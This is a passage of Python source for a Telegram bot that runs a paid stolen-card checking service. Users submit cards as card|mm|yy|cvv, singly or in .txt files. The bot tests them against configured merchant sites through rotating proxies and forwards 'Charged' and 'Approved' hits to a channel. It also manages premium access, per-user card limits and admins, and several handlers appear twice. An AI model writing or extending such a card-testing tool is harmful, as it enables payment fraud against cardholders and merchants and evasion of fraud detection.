        if len(current_proxies) + len(proxies_to_add) > 30:
            await event.reply(pe(f"❌ You can only have up to 30 proxies. You currently have {len(current_proxies)}."), parse_mode='html')
            return
        status_msg = await event.reply(pe(f"🔄 Checking {len(proxies_to_add)} proxies before adding..."), parse_mode='html')
        alive_proxies = []
        dead_proxies = []
        already_exists = []
        for i, proxy in enumerate(proxies_to_add, 1):
            if proxy in current_proxies:
                already_exists.append(proxy)
                continue
            await status_msg.edit(pe(f"🔄 Checking [{i}/{len(proxies_to_add)}]: <code>{proxy[:30]}...</code>"), parse_mode='html')
            result = await test_proxy(proxy)
            if result['status'] == 'alive':
                alive_proxies.append(proxy)
                await status_msg.edit(pe(f"✅ Alive: <code>{proxy[:30]}...</code>\n\n📊 Alive: {len(alive_proxies)} | Dead: {len(dead_proxies)}"), parse_mode='html')
            else:
                dead_proxies.append(proxy)
                await status_msg.edit(pe(f"❌ Dead: <code>{proxy[:30]}...</code>\n\n📊 Alive: {len(alive_proxies)} | Dead: {len(dead_proxies)}"), parse_mode='html')
            await asyncio.sleep(0.5)
        if alive_proxies:
            all_proxies = current_proxies + alive_proxies
            set_user_proxies(user_id, all_proxies)
        result_text = f"""✅ Proxy Check & Add Complete!

📊 Results:
   ┣ ✅ Alive (Added): {len(alive_proxies)}
   ┣ ❌ Dead (Ignored): {len(dead_proxies)}
   ┣ ⚠️ Existing (Skipped): {len(already_exists)}
   ┗ 📁 Total proxies: {len(get_user_proxy_list(user_id))}"""
        await status_msg.edit(pe(result_text), parse_mode='html')
    except Exception as e:
        await event.reply(pe(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can check proxies."), parse_mode='html')
        return
    proxies = get_user_proxy_list(user_id)
    if not proxies:
        await event.reply(pe("❌ No proxies in your list!"), parse_mode='html')
        return
    status_msg = await event.reply(pe(f"🔄 Checking {len(proxies)} proxies..."), parse_mode='html')
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            await status_msg.edit(pe(f"🔄 Checking proxies...\n\nChecked: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAlive: {len(alive_proxies)}\nDead: {len(dead_proxies)}"), parse_mode='html')
        set_user_proxies(user_id, alive_proxies)
        await status_msg.edit(pe(f"✅ Proxy Check Complete!\n\nTotal: {len(proxies)}\nAlive: {len(alive_proxies)}\nRemoved: {len(dead_proxies)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(pe(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can check proxies."), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(pe("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(pe(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(pe(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(pe(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(pe(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can remove proxies."), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(pe("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    current_proxies = get_user_proxy_list(user_id)
    if proxy_to_remove not in current_proxies:
        await event.reply(pe(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    set_user_proxies(user_id, new_proxies)
    await event.reply(pe(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can remove proxies."), parse_mode='html')
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(pe("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(pe("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return
    current_proxies = get_user_proxy_list(user_id)
    if not current_proxies:
        await event.reply(pe("❌ No proxies in your list."), parse_mode='html')
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await event.reply(pe("❌ No valid indices found."), parse_mode='html')
        return
    set_user_proxies(user_id, new_proxies)
    removed_text = "\n".join(removed[:10])
    await event.reply(pe(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can clear proxies."), parse_mode='html')
        return
    current_proxies = get_user_proxy_list(user_id)
    count = len(current_proxies)
    if count == 0:
        await event.reply(pe("❌ Your proxy list is already empty."), parse_mode='html')
        return
    set_user_proxies(user_id, [])
    await event.reply(pe(f"✅ Cleared all {count} proxies!\n\nYour proxy list is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/myproxy'))
async def myproxy(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can view own proxies."), parse_mode='html')
        return
    proxies = get_user_proxy_list(user_id)
    if not proxies:
        await event.reply(pe("📭 No proxies found."), parse_mode='html')
        return
    text = "\n".join(proxies[:50])
    await event.reply(pe(f"🔌 Your Proxies ({len(proxies)}):\n{text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if not await is_user_member(user_id):
        await show_verification_screen(event)
        return
    if not is_premium(user_id):
        await event.reply(pe("❌ Only premium users can download proxies."), parse_mode='html')
        return
    current_proxies = get_user_proxy_list(user_id)
    if not current_proxies:
        await event.reply(pe("❌ No proxies in your list."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"proxies_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        for i, proxy in enumerate(current_proxies):
            await f.write(f"{i+1}. {proxy}\n")
    await event.reply(pe(f"📋 Your Proxies ({len(current_proxies)}):"), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

# =============== /SETPROXY (old) keep as fallback ===============
@bot.on(events.NewMessage(pattern=r'^/setproxy(\s+[\s\S]+)?$'))
async def setproxy_command(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    content = event.message.text[len('/setproxy'):].strip()
    if not content:
        user_list = get_user_proxy_list(uid)
        if user_list:
            listed = "\n".join(f"  <code>{p}</code>" for p in user_list[:10])
            extra  = f"\n  <i>+{len(user_list)-10} more</i>" if len(user_list) > 10 else ""
            await event.reply(pe(
                f"🔌 <b>Your Proxies  ({len(user_list)})</b>\n"
                f"<b>{SEP}</b>\n"
                f"{listed}{extra}\n"
                f"<b>{SEP}</b>\n"
                f"Replace: <code>/setproxy ip:port</code>\n"
                f"Clear:   <code>/clearuserproxy</code>"
            ), parse_mode='html')
        else:
            await event.reply(pe(
                f"🔌 <b>Set Your Proxy</b>\n"
                f"<b>{SEP}</b>\n"
                f"<b>Single:</b>\n"
                f"<code>/setproxy ip:port</code>\n"
                f"<code>/setproxy ip:port:user:pass</code>\n\n"
                f"<b>Multiple (one per line):</b>\n"
                f"<code>/setproxy\nip:port\nip:port:user:pass</code>\n"
                f"<b>{SEP}</b>\n"
                f"Multiple proxies rotate automatically per card 🔁"
            ), parse_mode='html')
        return
    new_proxies = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
    set_user_proxies(uid, new_proxies)
    count = len(new_proxies)
    await event.reply(pe(
        f"✅ <b>Proxy {'Set' if count == 1 else 'Updated'}</b>\n"
        f"<b>{SEP}</b>\n"
        f"📡 <b>Active:</b> {count} {'proxy' if count == 1 else 'proxies'}\n"
        f"🔁 Rotating per card automatically\n"
        f"<b>{SEP}</b>\n"
        f"Test: <code>/chkproxy {new_proxies[0]}</code>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clearuserproxy_command(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    remove_user_proxy(uid)
    await event.reply(pe(
        f"✅ <b>Proxy Cleared</b>\n"
        f"<b>{SEP}</b>\n"
        f"Your personal proxy has been removed."
    ), parse_mode='html')

# =============== SINGLE CHECK ===============
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_check(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(
            f"❌ <b>Access Denied</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔒 You need access to use this bot.\n"
            f"Contact the owner to get added.\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
        return

    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites:
        await event.reply(pe(
            f"❌ <b>No Sites Available</b>\n"
            f"<b>{SEP}</b>\n"
            f"Contact the admin to configure sites."
        ), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(
            f"❌ <b>No Proxy Configured</b>\n"
            f"<b>{SEP}</b>\n"
            f"Add a proxy first:\n"
            f"<code>/setproxy ip:port</code>\n"
            f"<code>/setproxy ip:port:user:pass</code>"
        ), parse_mode='html')
        return

    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(
            f"❌ <b>Invalid Format</b>\n"
            f"<b>{SEP}</b>\n"
            f"Usage:  <code>/sh card|mm|yy|cvv</code>"
        ), parse_mode='html')
        return

    card = cards[0]
    smsg = await event.reply(
        pe(
            f"⚡ <b>Checking Card...</b>\n"
            f"<b>{SEP}</b>\n"
            f"🃏 <tg-spoiler><code>{card}</code></tg-spoiler>\n"
            f"<b>{SEP}</b>\n"
            f"⏳ Please wait..."
        ),
        parse_mode='html',
    )
    try:
        t0 = time.time()
        (result, bin_info), (name, username) = await asyncio.gather(
            asyncio.gather(
                check_card_with_retry(card, sites, proxies, max_retries=3),
                get_bin_info(card.split('|')[0]),
            ),
            get_user_info(uid),
        )
        cname          = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)
        resp = build_result_card(result, bin_info, uid, cname)
        await raw_edit(uid, smsg.id, resp, [])
        if result.get('status') == 'Charged':
            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
            await forward_hit_to_channel(result, uid, 'Charged')
            await send_hit_log(uid, result, 'Charged')
        elif result.get('status') == 'Approved':
            await forward_hit_to_channel(result, uid, 'Approved')
            await send_hit_log(uid, result, 'Approved')
    except Exception as e:
        await smsg.edit(pe(
            f"❌ <b>Check Failed</b>\n"
            f"<b>{SEP}</b>\n"
            f"⚠️ Error: <code>{e}</code>"
        ), parse_mode='html')

# =============== MASS CHECK ===============
@bot.on(events.NewMessage(pattern=r'^/msh$'))
async def mass_check_cmd(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(
            f"❌ <b>Access Denied</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔒 You need access to use this bot."
        ), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(pe(
            f"⚡ <b>How to Mass Check</b>\n"
            f"<b>{SEP}</b>\n"
            f"Reply to a <code>.txt</code> file with <code>/msh</code>\n"
            f"— or — send a <code>.txt</code> file directly!"
        ), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(pe(
            f"❌ <b>Invalid File</b>\n"
            f"<b>{SEP}</b>\n"
            f"Please reply to a <code>.txt</code> file."
        ), parse_mode='html')
        return
    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites:
        await event.reply(pe(f"❌ <b>No sites configured.</b>"), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(
            f"❌ <b>No Proxy Configured</b>\n"
            f"<b>{SEP}</b>\n"
            f"<code>/setproxy ip:port</code>"
        ), parse_mode='html')
        return
    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    try: os.remove(fp)
    except: pass
    if not cards:
        await event.reply(pe(
            f"❌ <b>No Valid Cards Found</b>\n"
            f"<b>{SEP}</b>\n"
            f"Format: <code>card|mm|yy|cvv</code>"
        ), parse_mode='html')
        return
    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]
        await event.reply(pe(
            f"⚠️ <b>File Trimmed</b>\n"
            f"<b>{SEP}</b>\n"
            f"📋 Limited to <b>{limit} cards</b>"
        ), parse_mode='html')
    text = pe(
        f"<b>🔥 Mass Check  —  Starting</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"☄️ <b>Checked</b>   »  0\n"
        f"💎 <b>Charged</b>   »  0\n"
        f"✅ <b>Approved</b>  »  0\n"
        f"⚠️ <b>3DS</b>       »  0\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

# =============== FILE DETECTION ===============
def _is_txt_file(e):
    if not e.file or e.via_bot_id:
        return False
    name = e.file.name or ''
    mime = e.file.mime_type or ''
    return name.endswith('.txt') or mime in ('text/plain', 'application/octet-stream') and name.endswith('.txt') or (not name and mime == 'text/plain')

@bot.on(events.NewMessage(func=_is_txt_file))
async def txt_detected(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(
            f"❌ <b>Access Denied</b>\n"
            f"<b>{SEP}</b>\n"
            f"🔒 You need access to use this bot."
        ), parse_mode='html')
        return

    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites:
        await event.reply(pe(
            f"❌ <b>No Sites Configured</b>\n"
            f"<b>{SEP}</b>\n"
            f"Ask admin to add one: <code>/addsite https://example.com</code>"
        ), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(
            f"❌ <b>No Proxy Configured</b>\n"
            f"<b>{SEP}</b>\n"
            f"Set one with: <code>/setproxy ip:port</code>"
        ), parse_mode='html')
        return

    fp = await event.message.download_media()
    if not fp:
        await event.reply(pe(f"❌ <b>File download failed. Try again.</b>"), parse_mode='html')
        return

    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(fp)
    except: pass

    cards = extract_cc(content)
    if not cards:
        await event.reply(pe(
            f"❌ <b>No Cards Found</b>\n"
            f"<b>{SEP}</b>\n"
            f"No valid card format found in file.\n"
            f"Format: <code>card|mm|yy|cvv</code>"
        ), parse_mode='html')
        return

    limit = get_user_limit(uid)
    if len(cards) > limit:
        await event.reply(pe(
            f"⚠️ <b>Limit Applied</b>\n"
            f"<b>{SEP}</b>\n"
            f"File contains <b>{len(cards)}</b> cards.\n"
            f"Your limit: <b>{limit}</b> — first {limit} will be checked."
        ), parse_mode='html')
        cards = cards[:limit]

    pending_checks[uid] = {'cards': cards}
    preview_lines = "\n".join([f'⭐ <tg-spoiler>{c}</tg-spoiler>' for c in cards[:3]])
    more = f"\n<i>  ...and {len(cards)-3} more cards</i>" if len(cards) > 3 else ""
    text = pe(
        f"📂 <b>File Detected</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Cards found:</b> <b>{len(cards)}</b>\n"
        f"<b>{SEP}</b>\n"
        f"{preview_lines}{more}\n"
        f"<b>{SEP}</b>\n"
        f"<b>🔥 Tap below to start checking</b>"
    )
    await raw_send(
        uid, text,
        [[{"text": "💳  Start Mass Check", "callback_data": f"start_check_{uid}"}]],
        reply_to=event.message.id,
    )

@bot.on(events.CallbackQuery(pattern=r"^start_check_\d+$"))
async def cb_start_check(event):
    uid = event.sender_id
    data = event.data.decode()
    target_uid = int(data.split('_')[-1])
    if uid != target_uid:
        await event.answer("❌ Not your check!", alert=True)
        return
    if not await is_user_member(uid):
        await event.answer("🔒 Join both channel & group first!", alert=True)
        return
    info = pending_checks.pop(uid, None)
    if not info:
        await event.answer("⚠️ Session expired. Resend the file.", alert=True)
        return
    cards   = info['cards']
    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites or not proxies:
        await event.answer("❌ No sites/proxies available.", alert=True)
        return
    await event.answer("🔥 Starting!", alert=False)
    text = pe(
        f"<b>🔥 Mass Check  —  Starting</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>"
    )
    msg_id = await raw_send(uid, text, rows_stop())
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

# =============== ADMIN COMMANDS (sites, proxy pool, etc.) ===============
@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    curr = load_proxies()
    if not curr:
        await event.reply(pe(f"⚠️ <b>Proxy pool is already empty.</b>"), parse_mode='html')
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bk = f"proxy_backup_{uid}_{ts}.txt"
    async with aiofiles.open(bk, 'w') as f:
        for p in curr: await f.write(f"{p}\n")
    await event.reply(pe(f"📋 <b>Backup  ({len(curr)} proxies)</b>"), file=bk, parse_mode='html')
    try: os.remove(bk)
    except: pass
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(pe(
        f"✅ <b>Proxy Pool Cleared</b>\n"
        f"<b>{SEP}</b>\n"
        f"🗑️ Removed <b>{len(curr)}</b> proxies. Backup sent above."
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    msg   = await event.reply(pe(
        f"⚡ <b>Testing Proxy...</b>\n"
        f"<b>{SEP}</b>\n"
        f"<code>{proxy}</code>"
    ), parse_mode='html')
    r        = await test_proxy(proxy)
    is_alive = r.get('status') == 'alive'
    if is_alive:
        ip_info = await get_proxy_ip(proxy)
        await msg.edit(pe(
            f"✅ <b>Proxy  —  Alive</b>\n"
            f"<b>{SEP}</b>\n"
            f"📡 <code>{proxy}</code>\n"
            f"🌐 <b>Exit IP:</b>  <code>{ip_info or 'N/A'}</code>"
        ), parse_mode='html')
    else:
        await msg.edit(pe(
            f"❌ <b>Proxy  —  Dead</b>\n"
            f"<b>{SEP}</b>\n"
            f"📡 <code>{proxy}</code>"
        ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    sites   = load_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites:
        await event.reply(pe(
            f"🌐 <b>No Sites Configured</b>\n"
            f"<b>{SEP}</b>\n"
            f"Add: <code>/addsite https://example.com</code>"
        ), parse_mode='html')
        return
    if not proxies:
        await event.reply(pe(
            f"❌ <b>No Proxy Available</b>\n"
            f"<b>{SEP}</b>\n"
            f"A proxy is required to test sites."
        ), parse_mode='html')
        return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(sites)} sites...</b>"), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(sites), 10):
        batch   = sites[i:i+10]
        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
        for r in results:
            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
        await smsg.edit(pe(
            f"🔥 <b>Testing sites...</b>\n"
            f"<b>{SEP}</b>\n"
            f"✅ Alive: {len(alive)}  ·  ❌ Dead: {len(dead)}"
        ), parse_mode='html')
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive: await f.write(f"{s}\n")
    await smsg.edit(pe(
        f"✅ <b>Site Check Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>✅ <b>Alive:</b>    {len(alive)}\n"
        f"❌ <b>Removed:</b>  {len(dead)}</blockquote>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/(rm|rmsite)\s+'))
async def remove_site_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    site = event.message.text.split(' ', 1)[1].strip()
    curr = load_sites()
    if site not in curr:
        await event.reply(pe(
            f"❌ <b>Site Not Found</b>\n"
            f"<b>{SEP}</b>\n"
            f"<code>{site}</code>"
        ), parse_mode='html')
        return
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in curr:
            if s != site: await f.write(f"{s}\n")
    await event.reply(pe(f"✅ <b>Site Removed</b>\n<b>{SEP}</b>\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy'))
async def proxy_command(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(
            f"❌ <b>Proxy Pool Empty</b>\n"
            f"<b>{SEP}</b>\n"
            f"Add proxies: <code>/addproxy ip:port</code>"
        ), parse_mode='html')
        return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(proxies)} proxies...</b>"), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 50):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+50]])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        await smsg.edit(pe(
            f"🔥 <b>Testing proxies...</b>\n"
            f"<b>{SEP}</b>\n"
            f"✅ Alive: {len(alive)}  ·  ❌ Dead: {len(dead)}"
        ), parse_mode='html')
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive: await f.write(f"{p}\n")
    await smsg.edit(pe(
        f"✅ <b>Proxy Check Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>✅ <b>Alive:</b>    {len(alive)}\n"
        f"❌ <b>Removed:</b>  {len(dead)}</blockquote>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_command(event):
    uid = event.sender_id
    if not await is_user_member(uid):
        await show_verification_screen(event)
        return
    lim = get_user_limit(uid)
    if is_admin(uid):
        await event.reply(pe(
            f"👑 <b>Your Access</b>\n"
            f"<b>{SEP}</b>\n"
            f"<blockquote>"
            f"🔑 <b>Role</b>     »  Admin\n"
            f"⚡ <b>Status</b>  »  Full access\n"
            f"📋 <b>Limit</b>   »  {lim:,} cards/file"
            f"</blockquote>\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
    elif is_premium(uid):
        await event.reply(pe(
            f"✅ <b>Your Access</b>\n"
            f"<b>{SEP}</b>\n"
            f"<blockquote>"
            f"🔑 <b>Role</b>     »  Premium\n"
            f"⚡ <b>Status</b>  »  Active\n"
            f"📋 <b>Limit</b>   »  {lim:,} cards/file"
            f"</blockquote>\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')
    else:
        await event.reply(pe(
            f"🚫 <b>No Access</b>\n"
            f"<b>{SEP}</b>\n"
            f"You are not on the access list.\n"
            f"Contact the owner to get added.\n"
            f"<b>{SEP}</b>\n"
            f"{DEV_LINE}"
        ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_panel_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    await raw_send(event.sender_id, _admin_panel_text(), rows_admin())

@bot.on(events.NewMessage(pattern=r'^/setadmin(\s+.*)?$'))
async def setadmin_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    parts        = event.message.text.strip().split()
    current_list = "\n".join(f"  • <code>{a}</code>" for a in sorted(ADMIN_IDS))
    if len(parts) < 2:
        await event.reply(pe(
            f"<b>👑 Admin Management</b>\n"
            f"<b>{SEP}</b>\n"
            f"<b>Current admins:</b>\n{current_list}\n"
            f"<b>{SEP}</b>\n"
            f"<b>Add:</b>    <code>/setadmin add [user_id]</code>\n"
            f"<b>Remove:</b> <code>/setadmin rm [user_id]</code>"
        ), parse_mode='html')
        return
    action = parts[1].lower()
    if action in ("add", "rm", "remove") and len(parts) >= 3:
        try:
            target = int(parts[2])
        except ValueError:
            await event.reply(pe(f"❌ <b>Invalid user ID.</b>"), parse_mode='html')
            return
        if action == "add":
            ADMIN_IDS.add(target)
            _save_admin_ids(ADMIN_IDS)
            _register_commands()
            await event.reply(pe(
                f"✅ <b>Admin Added</b>\n"
                f"<b>{SEP}</b>\n"
                f"<code>{target}</code> now has admin access."
            ), parse_mode='html')
        else:
            if target in _DEFAULT_ADMINS:
                await event.reply(pe(
                    f"❌ <b>Cannot Remove Default Admin</b>\n"
                    f"<b>{SEP}</b>\n"
                    f"<code>{target}</code> is protected."
                ), parse_mode='html')
                return
            ADMIN_IDS.discard(target)
            _save_admin_ids(ADMIN_IDS)
            _register_commands()
            await event.reply(pe(
                f"✅ <b>Admin Removed</b>\n"
                f"<b>{SEP}</b>\n"
                f"<code>{target}</code> removed from admins."
            ), parse_mode='html')
    else:
        await event.reply(pe(
            f"<b>👑 Admin Management</b>\n"
            f"<b>{SEP}</b>\n"
            f"<b>Add:</b>    <code>/setadmin add [user_id]</code>\n"
            f"<b>Remove:</b> <code>/setadmin rm [user_id]</code>"
        ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def add_site_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    new_site = event.message.text.split(' ', 1)[1].strip()
    if not new_site.startswith('http'):
        await event.reply(pe(f"❌ URL must start with <code>http</code>"), parse_mode='html')
        return
    curr = load_sites()
    if new_site in curr:
        await event.reply(pe(f"⚠️ <b>Site already exists.</b>"), parse_mode='html')
        return
    async with aiofiles.open(SITES_FILE, 'a') as f:
        await f.write(f"{new_site}\n")
    await event.reply(pe(
        f"✅ <b>Site Added</b>\n"
        f"<b>{SEP}</b>\n"
        f"<code>{new_site}</code>\n"
        f"📋 Total: {len(curr)+1} sites"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    msg_text    = event.message.text.split(' ', 1)[1].strip()
    all_targets = set()
    data = load_premium_users_dict()
    for u in data:
        try: all_targets.add(int(u))
        except: pass
    for u in ADMIN_IDS:
        all_targets.add(u)

    if not all_targets:
        await event.reply(pe(f"⚠️ <b>No users to broadcast to.</b>"), parse_mode='html')
        return

    status_msg = await event.reply(pe(
        f"📡 <b>Broadcasting...</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Targets:</b> {len(all_targets)} users"
    ), parse_mode='html')

    sent = 0
    failed = 0
    for target in all_targets:
        try:
            await bot.send_message(target, pe(
                f"📢 <b>Announcement  —  {BOT_BRAND}</b>\n"
                f"<b>{SEP}</b>\n"
                f"{msg_text}\n"
                f"<b>{SEP}</b>\n"
                f"{DEV_LINE}"
            ), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
